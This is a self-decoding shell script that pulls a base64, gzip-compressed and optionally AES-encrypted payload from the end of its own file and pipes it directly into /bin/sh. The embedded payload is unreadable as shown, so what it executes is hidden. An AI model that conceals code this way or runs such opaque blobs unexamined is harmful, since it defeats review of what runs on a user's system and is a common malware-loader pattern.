#!/usr/bin/env sh
# Self-decoding shell script (gzip+base64, optional AES-256-CBC via OpenSSL)
# If encrypted: set OBF_PASSPHRASE env or you will be prompted interactively.

set -eu

need() {
  command -v "$1" >/dev/null 2>&1
}

dec_b64() {
  # Decode base64 from stdin to stdout using available tools
  if need base64; then base64 -d 2>/dev/null || base64 --decode; return; fi
  if need openssl; then openssl base64 -d; return; fi
  if need python3; then python3 - <<'PY'
import sys, base64
sys.stdout.buffer.write(base64.b64decode(sys.stdin.buffer.read()))
PY
  return; fi
  if need python; then python - <<'PY'
import sys, base64
sys.stdout.write(base64.b64decode(sys.stdin.read()))
PY
  return; fi
  if need perl; then perl -MMIME::Base64 -ne 'print decode_base64($_)'; return; fi
  if need busybox; then busybox base64 -d; return; fi
  echo "No base64 decoder found." >&2; exit 1
}

dec_gzip() {
  # Decompress gzip from stdin to stdout
  if need gzip; then gzip -dc; return; fi
  if need busybox; then busybox gzip -dc; return; fi
  # Python fallback using zlib
  if need python3; then python3 - <<'PY'
import sys, zlib
sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read(), 16+zlib.MAX_WBITS))
PY
  return; fi
  if need python; then python - <<'PY'
import sys, zlib
sys.stdout.write(zlib.decompress(sys.stdin.read(), 16+zlib.MAX_WBITS))
PY
  return; fi
  echo "No gzip decompressor found." >&2; exit 1
}

dec_aes() {
  # Decrypt AES-256-CBC with OpenSSL from stdin to stdout using OBF_PASSPHRASE
  if ! need openssl; then
    echo "OpenSSL not available for AES decryption." >&2; exit 1
  fi
  pass="${OBF_PASSPHRASE:-}"
  if [ -z "$pass" ]; then
    printf "Enter passphrase: " >&2
    stty -echo 2>/dev/null || true
    IFS= read -r pass || true
    stty echo 2>/dev/null || true
    echo >&2
  fi
  # pbkdf2 because the obfuscator used it
  OPENSSL_PASS="pass:$pass" exec openssl enc -d -aes-256-cbc -pbkdf2 -pass "$OPENSSL_PASS"
}

# Metadata injected by obfuscator
OBF_ENCRYPTED="0"

# Payload below between markers
PAYLOAD_B64_START="__OBF_B64_PAYLOAD_START__"
PAYLOAD_B64_END="__OBF_B64_PAYLOAD_END__"

# Extract the base64 payload lines
extract_payload() {
  awk "/$PAYLOAD_B64_START/{flag=1;next}/$PAYLOAD_B64_END/{flag=0}flag" "$0"
}

run() {
  if [ "$OBF_ENCRYPTED" = "1" ]; then
    extract_payload | dec_b64 | dec_aes | dec_gzip | /bin/sh -s -- "$@"
  else
    extract_payload | dec_b64 | dec_gzip | /bin/sh -s -- "$@"
  fi
}

run "$@"
exit 0

__OBF_B64_PAYLOAD_START__
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
__OBF_B64_PAYLOAD_END__
